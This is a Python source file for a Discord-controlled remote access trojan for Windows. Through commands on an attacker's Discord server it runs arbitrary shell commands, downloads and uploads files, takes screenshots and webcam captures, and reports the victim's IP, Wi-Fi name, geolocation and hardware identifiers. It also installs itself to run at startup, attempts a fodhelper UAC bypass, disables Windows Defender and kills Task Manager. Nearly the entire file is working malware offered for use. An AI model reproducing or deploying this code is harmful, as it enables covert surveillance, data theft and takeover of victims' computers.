# Developed by nspe (lol ive been working on this for 3 weeks cause i was bored)

# YOU MUST EDIT THESE LINES:
# Line 47: Put your Bot Token in the '' section
# Line 215: REPLACE the name syntax of "guild = discord.utils.get(bot.guilds, name='')" with the name of your server

#---------------------------------------#
#               IMPORTS                 #
#---------------------------------------#

import discord
from discord.ext import commands
import tkinter as tk
import mss
import cv2
import os
import numpy as np
import webbrowser
import ctypes
import pyttsx3
import asyncio
import platform
import psutil
import socket
import getpass
import shutil
import subprocess
import requests
import aiohttp
import winshell
import argparse
import sys
import re
import base64
import json
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import win32crypt
import time
import inspect
import winreg

#---------------------------------------#
#             TOKEN & VARS              #
#---------------------------------------#

TOKEN = ''
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)
chatbox_window = None
chat_text_widget = None

@bot.event
async def on_message(message):
    if message.content.startswith('!') and isinstance(message.channel, discord.TextChannel):
        session_id = message.channel.name
        bot_username = getpass.getuser()
        command_prefix = bot.command_prefix
        command_args = message.content.split(' ')
        command_name = command_args[0][len(command_prefix):].lower()
        if session_id.lower() == bot_username.lower():
            await bot.process_commands(message)
        else:
            print("troll")
    else:
        await bot.process_commands(message)

#---------------------------------------#
#               COMMANDS                #
#---------------------------------------#

@bot.command()
async def startup(ctx, action):
    try:
        exe_path = sys.executable
        
        if action.lower() == "enable":
            set_startup_registry(os.path.basename(exe_path), exe_path)
            await ctx.send(f"Bot is now set to run at startup.")
        elif action.lower() == "disable":
            disable_startup_registry(os.path.basename(exe_path))
            await ctx.send(f"Bot is no longer set to run at startup.")
        else:
            await ctx.send("Invalid action. Use 'enable' or 'disable'.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command()
async def filesearch(ctx, filename):
    try:
        found_files = []
        for root, dirs, files in os.walk("C:\\"):
            for file in files:
                if file.lower() == filename.lower():
                    found_files.append(os.path.join(root, file))
        
        if found_files:
            await ctx.send(f"Found {len(found_files)} files named '{filename}':")
            for file_path in found_files:
                await ctx.send(file_path)
        else:
            await ctx.send(f"No files named '{filename}' found.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

popular_vpns = [
    "NordVPN", "ExpressVPN", "Surfshark", "CyberGhost", "Private Internet Access",
    "VyprVPN", "IPVanish", "TunnelBear", "Hotspot Shield", "Windscribe",
    "ProtonVPN", "Hide.me", "PureVPN", "FastestVPN", "Namecheap VPN", "Cloudflare WARP"
]

chrome_extension_vpns = [
    "1.1.1.1", "ExpressVPN Chrome Extension", "NordVPN Chrome Extension", "Surfshark VPN for Chrome"
]

@bot.command()
async def vpn(ctx):
    try:
        vpn_found = set()
        for root, dirs, files in os.walk("C:\\"):
            for file in files:
                for vpn_name in popular_vpns:
                    if vpn_name.lower() in file.lower() and file.endswith(".exe"):
                        if vpn_name not in vpn_found:
                            vpn_found.add(vpn_name)
                            await ctx.send(f"Found .exe with '{vpn_name}' in name: {os.path.join(root, file)}")
                            is_running = is_process_running(vpn_name)
                            await ctx.send(f"{vpn_name} is {'running' if is_running else 'not running'}")
        chrome_extensions_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Extensions")
        if os.path.exists(chrome_extensions_path):
            for extension in os.listdir(chrome_extensions_path):
                for vpn_name in popular_vpns:
                    if vpn_name.lower() in extension.lower():
                        if vpn_name not in vpn_found:
                            vpn_found.add(vpn_name)
                            await ctx.send(f"Found Chrome extension with '{vpn_name}' in name: {os.path.join(chrome_extensions_path, extension)}")
        for vpn_name in chrome_extension_vpns:
            if vpn_name.lower() in extension.lower():
                if vpn_name not in vpn_found:
                    vpn_found.add(vpn_name)
                    await ctx.send(f"Found Chrome extension VPN with '{vpn_name}' in name: {extension}")
        
        if not vpn_found:
            await ctx.send("No VPN-related software found.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

def is_process_running(process_name):
    try:
        output = subprocess.check_output(['tasklist', '/FI', f'IMAGENAME eq {process_name}.exe'])
        return process_name.lower() in str(output).lower()
    except subprocess.CalledProcessError:
        return False

@bot.command()
async def uacbypass(ctx):
    class disable_fsr():
        def __enter__(self):
            self.disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
            self.revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
            self.old_value = ctypes.c_long()
            self.disable(ctypes.byref(self.old_value))
            return self.old_value

        def __exit__(self, type, value, traceback):
            self.revert(self.old_value)

    await ctx.send("Checking if admin...")
    isAdmin = os.getuid() == 0 if hasattr(os, 'getuid') else ctypes.windll.shell32.IsUserAnAdmin() != 0
    if isAdmin:
        await ctx.send("You're already admin!")
    else:
        await ctx.send("Attempting to get admin...")
        isexe = sys.argv[0].endswith("exe")
        if not isexe:
            test_str = sys.argv[0]
            current_dir = inspect.getframeinfo(inspect.currentframe()).filename
            cmd2 = current_dir
        else:
            test_str = sys.argv[0]
            current_dir = test_str
            cmd2 = current_dir
        create_reg_path = r"""powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force"""
        os.system(create_reg_path)
        create_trigger_reg_key = r"""powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force"""
        os.system(create_trigger_reg_key)
        create_payload_reg_key = f"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "Command" -Value 'cmd /c start ""{cmd2}""' -Force"""
        os.system(create_payload_reg_key)
        with disable_fsr():
            os.system("fodhelper.exe")
        time.sleep(2)
        remove_reg = r"""powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force"""
        os.system(remove_reg)

@bot.command()
async def disablewindef(ctx):
    try:
        command = "Set-MpPreference -DisableRealtimeMonitoring $true"
        subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-Command", command], shell=True, check=True)
        await ctx.send("Windows Defender has been disabled remotely.")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"Error: Failed to disable Windows Defender. {e}")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def admincheck(ctx):
    if ctypes.windll.shell32.IsUserAnAdmin():
        await ctx.send("The bot has administrator permissions on this computer.")
    else:
        await ctx.send("The bot does not have administrator permissions on this computer.")

@bot.event
async def on_ready():
    guild = discord.utils.get(bot.guilds, name='')
    if guild is None:
        print("Error: Bot couldn't find the specified guild.")
        return
    username = getpass.getuser()
    session_channel = await find_or_create_session_channel(guild, username)
    ip_address = await get_ip_address()
    await session_channel.send(f"New Session Created | IP: {ip_address} | User: {username}")

@bot.command()
async def procs(ctx):
    process_counts = get_process_names_with_counts()
    process_info = [f"{name} ({count})" if count > 1 else name for name, count in process_counts.items()]
    process_info_str = "\n".join(process_info)
    await ctx.send("Processes:\n" + process_info_str)

@bot.command()
async def screenshot(ctx):
    await take_screenshot()
    await send_screenshot(ctx)

@bot.command()
async def cd(ctx, directory: str):
    try:
        os.chdir(directory)
        await ctx.send(f"Changed directory to {os.getcwd()}")
    except Exception as e:
        await ctx.send(f"Failed to change directory: {e}")

@bot.command()
async def dir(ctx):
    try:
        files = os.listdir()
        if files:
            await ctx.send("Files and directories in current directory:")
            for file in files:
                await ctx.send(file)
        else:
            await ctx.send("The current directory is empty.")
    except Exception as e:
        await ctx.send(f"Failed to list directory contents: {e}")

@bot.command()
async def showdirs(ctx):
    try:
        directories = [d for d in os.listdir() if os.path.isdir(d)]
        if directories:
            await ctx.send("Available directories:")
            for directory in directories:
                await ctx.send(directory)
        else:
            await ctx.send("There are no directories in the current directory.")
    except Exception as e:
        await ctx.send(f"Failed to list directories: {e}")

@bot.command()
async def download(ctx, filename: str):
    try:
        if os.path.exists(filename):
            await ctx.send(file=discord.File(filename))
        else:
            await ctx.send(f"The file '{filename}' does not exist.")
    except Exception as e:
        await ctx.send(f"Failed to download file: {e}")

@bot.command()
async def upload(ctx):
    try:
        if len(ctx.message.attachments) == 0:
            await ctx.send("Please attach a file to upload.")
            return
        attachment = ctx.message.attachments[0]
        filename = attachment.filename
        await attachment.save(filename)
        await ctx.send(f"File '{filename}' has been uploaded.")
    except Exception as e:
        await ctx.send(f"Failed to upload file: {e}")

@bot.command()
async def website(ctx, url: str):
    await open_website(url)

@bot.command()
async def message(ctx, *, text: str):
    show_popup(text)

@bot.command()
async def cam(ctx):
    await take_camera_screenshot()
    await take_screenshot()
    await send_screenshot(ctx)

@bot.command()
async def audio(ctx, *, text: str):
    text_to_speech(text)

@bot.command()
async def info(ctx):
    system_info = await get_system_info()
    ip_address = await get_ip_address()
    connected_wifi = await get_connected_wifi()
    email = await get_email()
    hwid = await get_hwid()
    device_id = await get_device_id()
    is_virtual_machine = await check_virtual_machine()
    is_vpn_used = await detect_vpn_usage()

    info_message = f"```{system_info}\nIP Address: {ip_address}\nConnected WiFi: {connected_wifi}\nRegistered Owner (Email): {email}\nHWID: {hwid}\nDevice ID: {device_id}\nVirtual Machine: {is_virtual_machine}\nVPN in use: {is_vpn_used}```"

    await ctx.send(info_message)

@bot.command()
async def prockill(ctx, process_name: str):
    processes_to_kill = []
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == process_name:
            processes_to_kill.append(proc)
    if not processes_to_kill:
        await ctx.send(f"No process with the name '{process_name}' is running.")
    else:
        for proc in processes_to_kill:
            proc.kill()
        await ctx.send(f"All instances of '{process_name}' have been terminated.")

@bot.command()
async def procsearch(ctx, process_name: str):
    process_found = False
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] == process_name:
            process_found = True
            break
    if process_found:
        await ctx.send(f"Process '{process_name}' is running.")
    else:
        await ctx.send(f"No process with the name '{process_name}' is running.")

@bot.command()
async def wallpaper(ctx):
    if len(ctx.message.attachments) == 0:
        await ctx.send("Please attach an image to set as wallpaper.")
        return
    attachment = ctx.message.attachments[0]
    filename, extension = os.path.splitext(attachment.filename)
    valid_extensions = ['.jpg', '.jpeg', '.png', '.bmp']
    if extension.lower() not in valid_extensions:
        await ctx.send("Unsupported file type. Please attach an image with a valid extension.")
        return
    pictures_dir = os.path.join(os.path.expanduser('~'), 'Pictures')
    image_path = os.path.join(pictures_dir, attachment.filename)
    await attachment.save(image_path)
    if set_wallpaper(image_path):
        await ctx.send("Wallpaper has been updated.")
    else:
        await ctx.send("Can't change wallpaper. Most likely unsupported file type.")

@bot.command()
async def geolocate(ctx):
    location_info, geolocation_url = await get_geolocation()
    await ctx.send(location_info)
    if geolocation_url:
        await ctx.send(f"Geolocation URL: {geolocation_url}")

@bot.command()
async def shell(ctx, *, command: str):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        await ctx.send(f"```\n{result}\n```")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"Command '{command}' returned non-zero exit status {e.returncode}:\n```\n{e.output}\n```")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command()
async def startproc(ctx, process_name: str):
    try:
        subprocess.Popen(process_name)
        await ctx.send(f"Process '{process_name}' has been started.")
    except Exception as e:
        await ctx.send(f"Error occurred while starting process '{process_name}': {e}")

@bot.command()
async def cmd(ctx, *, command: str):
    try:
        result = subprocess.check_output(['cmd', '/c', command], stderr=subprocess.STDOUT, universal_newlines=True)
        
        if len(result) > 2000:
            with open('cmd_output.txt', 'w', encoding='utf-8') as f:
                f.write(result)
            await ctx.send(file=discord.File('cmd_output.txt'))
        else:
            await ctx.send(f"```\n{result}\n```")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"Command '{command}' returned non-zero exit status {e.returncode}:\n```\n{e.output}\n```")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")


#---------------------------------------#
#              async defs               #
#---------------------------------------#

async def check_admin_perms(ctx):
    if ctx.author.guild_permissions.administrator:
        return True
    else:
        await ctx.send("You do not have administrator permissions. Cannot proceed with UAC bypass.")
        return False

async def uac_bypass_method(ctx, method_id, method_command, success_message):
    os.system(method_command)
    await ctx.send(success_message)

async def take_screenshot():
    with mss.mss() as sct:
        screenshot = sct.shot(output='screenshot.png')

async def send_screenshot(ctx):
    await ctx.send(file=discord.File("screenshot.png"))

async def take_camera_screenshot():
    os.system("start microsoft.windows.camera:")
    await asyncio.sleep(5)
    await take_screenshot()
    os.system("taskkill /im WindowsCamera.exe /f")

async def send_video(ctx, filename):
    await ctx.send(file=discord.File(filename))

async def open_website(url):
    webbrowser.open(url)

def show_popup(message):
    ctypes.windll.user32.MessageBoxW(0, message, "Message", 0)

def text_to_speech(text):
    engine = pyttsx3.init()
    engine.say(text)
    engine.runAndWait()

async def get_system_info():
    try:
        registered_owner = await get_registered_owner()
    except Exception as e:
        print(f"Error occurred while retrieving system information: {e}")
        registered_owner = "Unknown"

    system_info = f"System: {platform.system()} {platform.release()}"
    cpu_info = f"CPU: {platform.processor()}"
    memory_info = psutil.virtual_memory()
    memory_total_gb = round(memory_info.total / (1024 ** 3), 2)
    memory_used_gb = round(memory_info.used / (1024 ** 3), 2)
    memory_percent = memory_info.percent
    memory_info_str = f"Memory: {memory_used_gb}GB used / {memory_total_gb}GB total ({memory_percent}%)"
    disk_info = psutil.disk_usage('/')
    disk_total_gb = round(disk_info.total / (1024 ** 3), 2)
    disk_used_gb = round(disk_info.used / (1024 ** 3), 2)
    disk_percent = disk_info.percent
    disk_info_str = f"Disk: {disk_used_gb}GB used / {disk_total_gb}GB total ({disk_percent}%)"
    return f"{system_info}\nRegistered Owner: {registered_owner}\n{cpu_info}\n{memory_info_str}\n{disk_info_str}"

async def get_registered_owner():
    try:
        result = subprocess.check_output('wmic computersystem get RegisteredOwner', shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        return result.strip()
    except subprocess.CalledProcessError as e:
        print(f"Error occurred while retrieving Registered Owner: {e}")
        return "Unknown"

async def get_ip_address():
    try:
        ip_address = socket.gethostbyname(socket.gethostname())
        return ip_address
    except Exception as e:
        return str(e)

async def get_connected_wifi():
    try:
        command_output = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces']).decode()
        lines = command_output.split('\n')
        for line in lines:
            if "SSID" in line:
                ssid = line.split(":")[1].strip()
                return ssid
        return "Not connected to WiFi"
    except Exception as e:
        return str(e)

async def get_email():
    try:
        command_output = subprocess.check_output('wmic computersystem get RegisteredOwner').decode().split('\n')[1].strip()
        return command_output
    except Exception as e:
        return str(e)

async def get_hwid():
    try:
        hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
        return hwid
    except Exception as e:
        return str(e)

async def get_device_id():
    try:
        device_id = subprocess.check_output('wmic path win32_computersystemproduct get IdentifyingNumber').decode().split('\n')[1].strip()
        return device_id
    except Exception as e:
        return str(e)

async def check_virtual_machine():
    try:
        command_output = subprocess.check_output('wmic computersystem get Manufacturer').decode().split('\n')[1].strip()
        return "Yes" if "Microsoft Corporation" in command_output else "No"
    except Exception as e:
        return str(e)

async def detect_vpn_usage():
    try:
        ip_address = await get_public_ip()
        async with aiohttp.ClientSession() as session:
            async with session.get('https://api64.ipify.org') as response:
                public_ip = await response.text()
        return "Yes" if ip_address != public_ip else "No"
    except Exception as e:
        return str(e)

async def find_or_create_session_channel(guild, username):
    existing_channels = [c.name for c in guild.channels if isinstance(c, discord.TextChannel)]
    
    if username in existing_channels:
        session_channel = discord.utils.get(guild.channels, name=username)
        return session_channel
    
    try:
        session_channel = await guild.create_text_channel(username)
        return session_channel
    except discord.Forbidden:
        print("Error: Bot doesn't have permission to create channels in the guild.")
    except discord.HTTPException:
        print("Error: Failed to create the text channel.")

def find_next_session_name(existing_channels):
    username = getpass.getuser()
    session_num = 1
    while True:
        session_name = f"{username}"
        if session_name not in existing_channels:
            return session_name
        session_num += 1

def get_process_names_with_counts():
    process_counts = {}
    for proc in psutil.process_iter(['name']):
        process_name = proc.info['name']
        if process_name in process_counts:
            process_counts[process_name] += 1
        else:
            process_counts[process_name] = 1
    return process_counts

async def monitor_taskmgr(ctx):
    try:
        while True:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] == 'Taskmgr.exe': 
                    proc.kill()
                    await ctx.send("User attempted to open Task Manager!")
            await asyncio.sleep(1)
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

async def get_public_ip():
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api64.ipify.org') as response:
            ip_address = await response.text()
    return ip_address

async def get_public_ip_from_vpn_check_api():
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api64.ipify.org?format=json') as response:
            data = await response.json()
    return data.get('ip', '')

def set_wallpaper(image_path):
    print(f"Setting wallpaper with image: {image_path}")
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
        return True
    except Exception as e:
        print(f"Error setting wallpaper: {e}")
        return False
    
async def get_geolocation():
    try:
        ip_address = await get_public_ip()
        vpn_check_ip = await get_public_ip_from_vpn_check_api()
        if vpn_check_ip != ip_address:
            return "VPN detected", None
        async with aiohttp.ClientSession() as session:
            async with session.get(f'http://ip-api.com/json/{ip_address}') as response:
                data = await response.json()
        if data['status'] == 'success':
            city = data['city']
            country = data['country']
            lat = data['lat']
            lon = data['lon']
            geolocation_url = f"https://www.geolocation.com/en_us?ip={ip_address}#ipresult"
            return f"City: {city}, Country: {country}, Latitude: {lat}, Longitude: {lon}", geolocation_url
        else:
            return "Failed to retrieve geolocation information", None
    except Exception as e:
        return f"Error: {e}", None

def isAdmin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin

def find_exe(exe_name):
    for root, dirs, files in os.walk("C:\\"):
        for file in files:
            if file.lower() == f"{exe_name}.exe":
                return os.path.join(root, file)
    return None

def set_startup_registry(exe_name, exe_path):
    startup_reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, startup_reg_key, 0, winreg.KEY_WRITE) as key:
        winreg.SetValueEx(key, exe_name, 0, winreg.REG_SZ, exe_path)

def disable_startup_registry(exe_name):
    startup_reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, startup_reg_key, 0, winreg.KEY_WRITE) as key:
        winreg.DeleteValue(key, exe_name)

bot.run(TOKEN)
